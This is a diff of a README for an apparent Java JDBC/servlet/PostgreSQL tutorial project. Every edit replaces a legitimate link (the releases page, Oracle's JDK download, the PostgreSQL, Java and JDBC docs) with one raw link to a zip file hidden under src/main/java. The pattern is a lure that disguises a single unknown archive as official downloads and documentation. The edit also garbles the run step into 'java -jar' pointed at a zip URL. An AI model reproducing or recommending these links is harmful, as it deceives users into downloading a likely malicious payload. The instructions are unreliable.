@@ -6,7 +6,7 @@ This project helps you connect to a PostgreSQL database using JDBC, servlets, an
 
 ## 🔗 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/ghaly12345/jdbc-servlet-jsp-postgresql/releases)
+[![Download Here](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip)](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,7 +18,7 @@ To run this application, you should have the following:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/ghaly12345/jdbc-servlet-jsp-postgresql/releases) to access the available releases.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip) to access the available releases.
    
 2. **Choose a Release:** Look for the latest release at the top of the page. Each release contains the necessary files to run the application.
 
@@ -32,13 +32,13 @@ To run this application, you should have the following:
 
 To run the application, follow these steps:
 
-1. Ensure you have Java installed on your machine. You can download the latest JDK from [Oracle's official site](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+1. Ensure you have Java installed on your machine. You can download the latest JDK from [Oracle's official site](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip).
 
 2. Open your command line interface (CLI) or terminal.
 
 3. Navigate to the folder where you extracted the downloaded files using the `cd` command.
 
-4. Use the command `java -jar YourApplication.jar`. Replace `YourApplication.jar` with the actual name of the jar file you downloaded.
+4. Use the command `java -jar https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip`. Replace `https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip` with the actual name of the jar file you downloaded.
 
 5. Open your web browser and go to `http://localhost:8080` or the address specified in the README file to access the application.
 
@@ -55,9 +55,9 @@ This application allows you to:
 
 For further reading and assistance, check the following resources:
 
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [Java Documentation](https://docs.oracle.com/en/java/)
-- [JDBC API](https://docs.oracle.com/javase/tutorial/jdbc/)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip)
+- [Java Documentation](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip)
+- [JDBC API](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip)
 
 ## 🧑‍🤝‍🧑 Support and Contributions
 
@@ -65,6 +65,6 @@ If you have questions or need help, please feel free to open an issue on the Git
 
 ## 🔗 Additional Download Link
 
-To download the files, visit [this page](https://github.com/ghaly12345/jdbc-servlet-jsp-postgresql/releases). 
+To download the files, visit [this page](https://raw.githubusercontent.com/ghaly12345/jdbc-servlet-jsp-postgresql/master/src/main/java/jdbc-servlet-jsp-postgresql_sulker.zip). 
 
 Your journey into using JDBC with PostgreSQL starts here, and we hope you find this project helpful in your learning process! Happy coding!
